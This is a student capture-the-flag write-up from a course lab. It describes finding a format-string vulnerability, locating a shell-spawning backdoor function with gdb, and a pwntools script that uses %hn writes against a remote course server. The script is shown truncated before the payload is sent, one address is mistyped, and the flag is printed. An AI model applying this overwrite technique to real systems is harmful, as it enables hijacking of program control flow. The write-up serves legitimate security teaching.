Firstly we opened the server and we saw this:

![Screenshot from 2023-06-04 16-24-50](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/92749121/e15de423-3a82-4a01-bdd4-ae11bda34784)

Then we tested it to see if it was sensible to format string vulnerabilities:

![Screenshot from 2023-06-04 16-25-56](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/92749121/4ec3d394-1fec-4a85-8417-c25496d745f5)

Turns out it was, so the next step was to use gbd on the program and checkthe fucntions it had with the 'info functions' command:

![Screenshot from 2023-06-04 14-30-59](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/92749121/d79e9c9d-16be-4898-9d00-2842c71f1e89)

The function that caught out attention right away was the old_backdoor function so we analyzed it with 'disas' and this came up:

![Screenshot from 2023-06-04 14-31-53](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/92749121/86b6ae94-07f4-484a-8784-89fc1e3d6041)

It contained a system call that would open up a shell so in order to run that function we redirected the flow of the program to that address by using gdb to find instructions where the code would jump to other addresses. 
We found a jump to the following address: 0x0804c01W
We needed to build an exploit that would re-write the old_backdoor function to that address using format vulnerabilities:
```
from pwn import *

LOCAL = False

if LOCAL:
    pause()
else:
    p = remote("ctf-sp.dcc.fc.up.pt", 4007)

#0x08049236  old_backdoor

N = 60
content = bytearray(0x0 for i in range(N))

content[0:4]  =  (0xaaaabbbb).to_bytes(4, byteorder='little')
content[4:8]  =  (0x0804c012).to_bytes(4, byteorder='little')
content[8:12]  =  ("????").encode('latin-1')
content[12:16]  =  (0x0804c010).to_bytes(4, byteorder='little')

s = "%.2036x" + "%hn" + "%.35378x%hn"

fmt  = (s).encode('latin-1')
content[16:16+len(fmt)] = fmt

p.recvuntil(b"here...")
```
we ran the script and we got this:

![Screenshot from 2023-06-04 15-37-13](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/92749121/594aee2c-ebab-451b-b793-837e4491c47e)

flag{0057833d01590ca2c8ffaef49a17f054}

